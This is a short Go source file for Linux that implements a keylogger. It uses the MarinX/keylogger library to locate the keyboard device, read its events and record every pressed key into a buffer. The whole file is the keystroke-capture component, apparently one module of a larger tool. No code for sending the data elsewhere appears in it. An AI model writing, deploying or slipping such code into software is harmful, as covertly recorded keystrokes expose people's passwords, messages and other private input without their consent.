//go:build linux
// +build linux

package keys

import (
	"bytes"
	"log"

	"github.com/MarinX/keylogger"
)

type LinuxLogger struct{}

func NewLinuxLogger() *LinuxLogger {
	return &LinuxLogger{}
}

func (l *LinuxLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
	device := keylogger.FindKeyboardDevice()
	if device == "" {
		logBuffer.WriteString("No keyboard found...")
	}
	keyboard, err := keylogger.New(device)
	if err != nil {
		log.Fatal(err)
	}

	events := keyboard.Read()

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			if e.KeyPress() {
				logBuffer.WriteString(e.KeyString())
			}
		}
	}
}
